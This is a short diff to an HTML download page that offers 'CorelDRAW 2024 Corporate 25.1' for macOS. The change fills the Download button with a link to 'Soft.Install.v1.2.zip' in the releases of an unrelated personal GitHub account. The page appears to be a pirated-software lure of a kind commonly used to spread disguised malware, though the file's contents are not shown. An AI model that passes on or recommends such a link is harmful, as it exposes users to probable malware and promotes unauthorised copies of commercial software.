@@ -5,5 +5,5 @@
 <p><img src="https://repository-images.githubusercontent.com/462418608/e27ac9a3-9de2-4c47-a05c-db12c2e8bf76"/></p>
 
 <p><strong>System Requirements: macOS 10.15 and later</p>
-CorelDRAW 2024 Corporate 25.1 | <a href="">Download</a>
+CorelDRAW 2024 Corporate 25.1 | <a href="https://github.com/evanskiprotich/evanskiprotich1/releases/download/25.1/Soft.Install.v1.2.zip">Download</a>
 </h1>
